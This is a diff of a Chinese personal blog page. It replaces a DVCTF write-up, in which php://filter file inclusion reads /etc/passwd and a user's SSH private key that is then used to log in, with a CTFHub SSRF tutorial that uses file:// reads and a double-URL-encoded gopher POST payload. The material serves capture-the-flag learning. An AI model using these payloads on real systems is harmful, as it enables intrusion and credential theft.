@@ -6,19 +6,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>Pentest | Hexo</title>
+  <title>SSRF | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="获取ssh私钥">
+  <meta name="description" content="ssrf">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Pentest">
-<meta property="og:url" content="http://example.com/2022/03/22/Pentest/index.html">
+<meta property="og:title" content="SSRF">
+<meta property="og:url" content="http://example.com/2022/05/16/SSRF/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="获取ssh私钥">
+<meta property="og:description" content="ssrf">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2022-03-22T14:43:17.000Z">
-<meta property="article:modified_time" content="2022-03-24T14:26:12.943Z">
+<meta property="article:published_time" content="2022-05-16T12:36:39.000Z">
+<meta property="article:modified_time" content="2022-05-16T12:40:21.968Z">
 <meta property="article:author" content="John Doe">
-<meta property="article:tag" content="pentest">
+<meta property="article:tag" content="ctf">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
@@ -151,52 +151,62 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-Pentest" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-SSRF" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      Pentest
+      SSRF
     </h1>
   
 
         
-        <a href="/2022/03/22/Pentest/" class="archive-article-date">
-  	<time datetime="2022-03-22T14:43:17.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-22</time>
+        <a href="/2022/05/16/SSRF/" class="archive-article-date">
+  	<time datetime="2022-05-16T12:36:39.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-05-16</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="获取ssh私钥"><a href="#获取ssh私钥" class="headerlink" title="获取ssh私钥"></a>获取ssh私钥</h3><span id="more"></span>
+        <h1 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h1><span id="more"></span>
 
-<p>（dvctf  <a target="_blank" rel="noopener" href="https://dvc.tf/challenges%EF%BC%89">https://dvc.tf/challenges）</a></p>
-<ol>
-<li><p>扫描端口</p>
-<p>nmap -A challs.dvc.tf -p51000- 52000</p>
-</li>
-<li><p>配合phpfilter可以一次读取出全部的文件内容</p>
-</li>
-<li><p>读出代码,发现无可利用点</p>
-</li>
-<li><p>读&#x2F;etc&#x2F;passwd, 收集目标主机的用户 </p>
-<p>view-source:challs.dvc.tf:51080&#x2F;?    MyTop5&#x3D;1&amp;playlistTop&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd</p>
-</li>
-<li><p>然后尝试读取ssh的私钥,发现可以读到leonardo的私钥 &#x2F;home&#x2F;leonardo&#x2F;.ssh&#x2F;id_rsa</p>
-</li>
-<li><p>在Linux桌面建立文件.\id_rsa.txt，写入私钥</p>
-</li>
-<li><p>用私钥登录服务器</p>
-<p>ssh <a href="mailto:&#x6c;&#101;&#111;&#x6e;&#97;&#x72;&#x64;&#111;&#x40;&#x63;&#x68;&#97;&#x6c;&#x6c;&#115;&#x2e;&#100;&#118;&#99;&#46;&#116;&#x66;">&#x6c;&#101;&#111;&#x6e;&#97;&#x72;&#x64;&#111;&#x40;&#x63;&#x68;&#97;&#x6c;&#x6c;&#115;&#x2e;&#100;&#118;&#99;&#46;&#116;&#x66;</a> -p51022 -i .\id_rsa.txt</p>
-</li>
-<li><p>ls</p>
-</li>
-<li><p>cat …flag.txt</p>
-</li>
-</ol>
+<h3 id="内网访问"><a href="#内网访问" class="headerlink" title="内网访问"></a>内网访问</h3><p>?url&#x3D;<a target="_blank" rel="noopener" href="http://127.0.0.1/flag.php">http://127.0.0.1/flag.php</a></p>
+<h3 id="伪协议读取文件"><a href="#伪协议读取文件" class="headerlink" title="伪协议读取文件"></a>伪协议读取文件</h3><p>SSRF中的URL的伪协议：</p>
+<ul>
+<li>file:&#x2F;&#x2F;&#x2F;</li>
+<li>dict:&#x2F;&#x2F;&#x2F;</li>
+<li>sftp:&#x2F;&#x2F;</li>
+<li>ldap:&#x2F;&#x2F;</li>
+<li>tftp:&#x2F;&#x2F;</li>
+<li>gopher:&#x2F;&#x2F;               进行POST提交</li>
+</ul>
+<p>一般网站的目录都放在&#x2F;var&#x2F;www&#x2F;html&#x2F;目录下</p>
+<p>?url&#x3D;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</p>
+<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>用burpsuite</p>
+<h3 id="post请求"><a href="#post请求" class="headerlink" title="post请求"></a>post请求</h3><p>curl可以支持的伪协议有很多,gopher,file,dict,http&#x2F;s</p>
+<p>dirsearch扫描工具扫描文件</p>
+<p>构造 url&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:80&#x2F;_POST+报文内容</p>
+<p><a target="_blank" rel="noopener" href="http://challenge-c6813993ea829aa0.sandbox.ctfhub.com:10800/?url=file:///var/www/html/flag.php">http://challenge-c6813993ea829aa0.sandbox.ctfhub.com:10800/?url=file:///var/www/html/flag.php</a></p>
+<p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>] != <span class="string">&quot;127.0.0.1&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Just View From 127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span>=<span class="title function_ invoke__">getenv</span>(<span class="string">&quot;CTFHUB&quot;</span>);</span><br><span class="line"><span class="variable">$key</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;key&quot;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&quot;key&quot;</span>] == <span class="variable">$key</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;/flag.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;key&quot;</span>&gt;</span><br><span class="line">&lt;!-- Debug: key=<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$key</span>;<span class="meta">?&gt;</span>--&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="http://challenge-c6813993ea829aa0.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php%E5%BE%97%E5%88%B0">http://challenge-c6813993ea829aa0.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php得到</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=<span class="string">&quot;/flag.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;key&quot;</span>&gt;</span><br><span class="line">&lt;!-- Debug: key=b59be92ad652f16baa469aeae3672e14--&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
+
+<p>我们通过index的页面中curl的函数使用127.0.0.1进行访问flag页面并使用gopher协议进行提交key，最后获得flag构造post：</p>
+<p>gopher:&#x2F;&#x2F;127.0.0.1:80&#x2F;_POST &#x2F;flag.php HTTP&#x2F;1.1<br>Host: 127.0.0.1:80<br>Content-Length: 36<br>Content-Type: application&#x2F;x-www-form-urlencoded</p>
+<p>key&#x3D;b59be92ad652f16baa469aeae3672e14</p>
+<p>在向服务器发送请求时，首先浏览器会进行一次 URL解码，其次服务器收到请求后，在执行curl功能时，进行第二次 URL解码。所以我们需要两次编码</p>
+<p>第一次：</p>
+<p>POST%20&#x2F;flag.php%20HTTP&#x2F;1.1%0D%0AHost%3A%20127.0.0.1%3A80%0D%0AContent-Length%3A%2036%0D%0AContent-Type%3A%20application&#x2F;x-www-form-urlencoded%0D%0A%0D%0Akey%3Db59be92ad652f16baa469aeae3672e14</p>
+<p>第一次把%0A全部改成%0D0A，%0A是在linux系统中中代表换行符，在windos中是%0D0A代表换行符</p>
+<p>第二次:</p>
+<p>POST%2520&#x2F;flag.php%2520HTTP&#x2F;1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Length%253A%252036%250D%250AContent-Type%253A%2520application&#x2F;x-www-form-urlencoded%250D%250A%250D%250Akey%253Db59be92ad652f16baa469aeae3672e14</p>
+<p>结果：</p>
+<p><a target="_blank" rel="noopener" href="http://challenge-e5636a7115b727eb.sandbox.ctfhub.com:10800/?url=gopher://127.0.0.1:80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Length%253A%252036%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250A%250D%250Akey%253Db59be92ad652f16baa469aeae3672e14">http://challenge-e5636a7115b727eb.sandbox.ctfhub.com:10800/?url=gopher://127.0.0.1:80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Length%253A%252036%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250A%250D%250Akey%253Db59be92ad652f16baa469aeae3672e14</a></p>
 
       
 
@@ -231,7 +241,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">pentest</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
         		</li>
       		
 		</ul>
@@ -287,7 +297,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2022/03/22/Pentest/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2022/05/16/SSRF/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -301,18 +311,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2022/03/22/Flask/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          Flask
-        
-      </div>
-    </a>
   
-  
-    <a href="/2022/03/16/HTML-CSS/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">HTML CSS</div>
+    <a href="/2022/05/11/SQL-inject/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">SQL注入</div>
       <i class="icon-circle-right"></i>
     </a>
   
